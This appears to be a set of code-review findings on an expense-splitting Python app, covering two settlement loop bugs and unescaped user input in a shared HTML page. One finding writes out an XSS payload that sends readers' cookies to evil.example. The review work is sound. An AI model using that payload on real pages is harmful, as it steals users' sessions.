# Candidate Findings

Raised by the bugs and edge cases Finder:

```
### settle skips the debtor after one who is paid off
- Severity (proposed): Important
- Bug class: list mutated while iterating it
- Locations: splitter/split.py:29, splitter/split.py:36
- Claim: The inner loop of `settle` walks `pending` and calls `pending.remove(item)` inside the same loop once a debtor's debt reaches zero. Removing from a Python list during a walk over it shifts the later items down one place, so the debtor right after a paid-off one is never visited for that creditor.
- Failure scenario: `settle({"Ana": 2000, "Eve": 500, "Ben": -1000, "Caro": -1000, "Dan": -500})`. For Ana, Ben pays 1000 and reaches zero, so he is removed; the walk then moves past Caro to Dan, who pays 500. Ana ends 500 short, Caro is never asked to pay her, and the transfers no longer bring every balance to zero, which the spec asks for.
- Evidence: `splitter/split.py:29` `for item in list(pending):`, `splitter/split.py:34` `item[1] -= pay`, `splitter/split.py:35-36` `if item[1] == 0:` / `pending.remove(item)`. Spec: "`split.settle(balances)` returns transfers `(debtor, creditor, cents)` that bring every balance to zero, for any number of debtors and creditors."
```

Raised by the spec Finder:

```
### Names typed by trip members reach the summary page unescaped
- Severity (proposed): Important
- Bug class: unescaped user input
- Locations: splitter/report.py:11, splitter/report.py:12, splitter/report.py:16
- Claim: `render_summary_html` escapes `description`, `debtor` and `title` but interpolates the expense row's payer and amount cells and the transfer's creditor into the HTML as they are. The spec says every name in the page was typed by a trip member and the page is shared with the whole group as a link, so this is stored HTML injection.
- Failure scenario: A trip member enters the payer name `<img src=x onerror="location='https://evil.example/?c='+document.cookie">`. `load_expenses` keeps it as `Expense.payer`; the payer cell renders it as markup, and because that payer is owed money, `settle` names them as the creditor and the transfers list renders it a second time. Everyone who opens the shared link runs the script.
- Evidence: `splitter/report.py:11` `f"<tr><td>{expense.payer}</td><td>{escape(expense.description)}</td>"`, `splitter/report.py:12` `f"<td>{format_cents(expense.amount_cents)}</td></tr>"`, `splitter/report.py:16` `moves.append(f"<li>{escape(debtor)} pays {creditor} {format_cents(cents)}</li>")`. Spec: "The page is shared with the whole group as a link, and every name and description in it was typed by a trip member."
```

Raised by the bugs and edge cases Finder:

```
### settle never pays the last creditor
- Severity (proposed): Important
- Bug class: off-by-one in a loop bound
- Locations: splitter/split.py:27
- Claim: The creditor loop runs over `range(len(creditors) - 1)`, so the last creditor in the sorted list is never paid. With one creditor the loop body never runs.
- Failure scenario: Ana pays 3000 for a trip of Ana, Ben and Caro. `balances` gives `{"Ana": 2000, "Ben": -1000, "Caro": -1000}`; there is one creditor, `range(0)` is empty, and `settle` returns `[]`, so the page tells no one to pay anyone. With two creditors, the one owed less is never paid.
- Evidence: `splitter/split.py:27` `for i in range(len(creditors) - 1):`. Spec: "`split.settle(balances)` returns transfers `(debtor, creditor, cents)` that bring every balance to zero, for any number of debtors and creditors."
```

Raised by the security and privacy Finder:

```
### Amounts go into the shared page without escaping
- Severity (proposed): Important
- Bug class: unescaped user input
- Locations: splitter/report.py:12, splitter/report.py:16
- Claim: Both amount cells interpolate `format_cents(...)` into the HTML with no `escape`, while `description`, `debtor` and `title` in the same f-strings are escaped. The amounts come from what trip members type (`load_expenses` takes the rows "as typed by trip members"), and nothing on the way to the page checks that the value is a number before it is written into markup.
- Failure scenario: An expense list that reaches `render_summary_html` with an `amount_cents` built from typed text, for example a row loaded by another importer into the `Expense` dataclass (which does not enforce its `int` annotation), is written into the shared page as it is. `format_cents` only formats what it is given, so markup in the amount reaches every reader of the link, the same stored HTML injection as an unescaped name.
- Evidence: `splitter/report.py:12` `f"<td>{format_cents(expense.amount_cents)}</td></tr>"`, `splitter/report.py:16` `... pays {creditor} {format_cents(cents)}</li>"`, `splitter/expenses.py:14` `"""rows: iterable of (payer, amount text, description) as typed by trip members."""`.
```
